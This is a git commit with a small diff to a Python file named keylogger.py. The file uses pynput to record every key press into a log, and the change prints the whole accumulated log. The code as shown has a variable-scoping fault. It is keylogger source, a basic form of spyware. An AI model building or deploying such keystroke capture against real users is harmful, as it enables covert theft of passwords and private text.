dab92637f454d2732964f65f3ed404052afec45d
Paul St. Amour <paul35444@aol.com>
2021-05-13 10:00:25 -0500

    -key print state +log print state to show what was captured

--- keylogger.py
+++ keylogger.py
@@ -5,7 +5,7 @@ log = ""
 
 def process_key_press(key):
     log = log + key
-    print(key)
+    print(log)
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
